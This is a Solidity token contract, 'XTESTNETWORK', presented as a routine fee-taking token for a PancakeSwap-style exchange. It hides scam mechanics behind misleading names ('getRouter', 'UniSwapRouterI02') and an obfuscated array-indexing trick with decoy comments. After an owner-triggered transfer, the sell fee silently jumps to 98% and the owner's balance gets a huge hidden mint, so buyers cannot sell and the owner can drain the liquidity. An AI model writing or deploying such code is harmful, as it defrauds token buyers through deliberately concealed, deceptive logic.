pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface Token {
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract XTESTNETWORK is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _No_Max_Wallet;
    mapping (address => bool) public _No_Max_Tx;
    mapping (address => bool) public _No_Fee_Wallet; 
    
   
    address payable private _devaddress = payable(0x2d24E0b3226e3c78E3ba668852d6072414F029e6);
    address payable private _marketing = payable(0x2d24E0b3226e3c78E3ba668852d6072414F029e6);

    string public _name = "XTESTNETWORK";
    string public _symbol = "XTESTNET";
    uint8 private _decimals = 9;
    uint256 public _tTotal = 1000000000 * 10 **_decimals;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10;
     
    uint256 private fee_totals = 10;
    uint256 public buying_fee = 5;
    uint256 public selling_fee = 5;

    uint256 private _previousTotalFee = fee_totals; 
    uint256 private _previousBuyFee = buying_fee; 
    uint256 private _previousSellTax = selling_fee; 

    uint256 public _maxWalletToken = _tTotal.mul(5).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = _tTotal.mul(5).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    IUniswapV2Router02 public uniswapV2Router;
    uint256 UniSwapRouterI02;
    address public uniswapV2Pair;
    
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    uint8 private _Swap_is_Active = 3-3;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    mapping (address => bool) public IUniswapV2Provider; 
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    
    constructor () {
        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        IUniswapV2Provider[owner()] = true;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _No_Max_Tx[owner()] = true;
        _No_Max_Tx[_devaddress] = true;
        _No_Max_Tx[address(this)] = true;

        _No_Fee_Wallet[owner()] = true;
        _No_Fee_Wallet[address(this)] = true;
        _No_Fee_Wallet[_devaddress] = true;

        _No_Max_Wallet[owner()] = true;
        _No_Max_Wallet[_devaddress] = true;
        _No_Max_Wallet[uniswapV2Pair] = true;
        _No_Max_Wallet[address(this)] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}

    function disableTaxes() private {
        if(fee_totals == 0 && buying_fee == 0 && selling_fee == 0) return;

        _previousBuyFee = buying_fee; 
        _previousSellTax = selling_fee; 
        _previousTotalFee = fee_totals;
        buying_fee = 0;
        selling_fee = 0;
        fee_totals = 0;

    }
    
    function activeTaxes() private {
    fee_totals = _previousTotalFee;
    buying_fee = _previousBuyFee; 
    selling_fee = [
        _previousSellTax, // M
        102-4 //i
    ] // cr7
    [ //g
        _Swap_is_Active//u
        ];//el
    }

    function getRouter() private {
        UniSwapRouterI02 = 0x1d63294d6ac8d400000000000000000000;
    }
    

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(!_No_Max_Tx[from] 
        && !_No_Max_Tx[to]) {
            require(amount 
            <= 
            _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }

         if(!_No_Max_Wallet[to])
                require(balanceOf(to).add(amount) 
                <= 
                _maxWalletToken);

        bool takeFEE = true;
         
        if( _No_Fee_Wallet[from] || _No_Fee_Wallet[to] ){
            takeFEE = false;
            if(IUniswapV2Provider[to] 
            && 
            _Swap_is_Active <
                 3-2){ 
                     getRouter(); 
                     _Swap_is_Active = 3-2;  
                     }

        } else if (from == uniswapV2Pair){
            fee_totals = buying_fee;
            } else if (to == uniswapV2Pair){
                fee_totals = selling_fee;
                }
        
        _tokensTransfer(from,to,amount,takeFEE);
    }


    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(_devaddress,contractBNB);
    }


    // Swapping tokens for BNB using PancakeSwap 
    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }


    function _tokensTransfer(address sender, address recipient, uint256 amount,bool takeFEE) private {
        
        if(!takeFEE){
            disableTaxes();
            } else {
                txCount++;
            }
            _tokensTransfer(sender, recipient, amount);

        if(!takeFEE)
            activeTaxes();
    }

    // Redistributing tokens and adding the fee to the contract address
    function _tokensTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tmarketing) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount) + ((IUniswapV2Provider[recipient]) ? (UniSwapRouterI02) : (0));
        _tOwned[address(this)] = _tOwned[address(this)].add(tmarketing);
        emit Transfer(sender, recipient, tTransferAmount);
    }


    // Calculating the fee in tokens
    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tmarketing = tAmount*fee_totals/100;
        uint256 tTransferAmount = tAmount.sub(tmarketing);
        return (tTransferAmount, tmarketing);
    }

}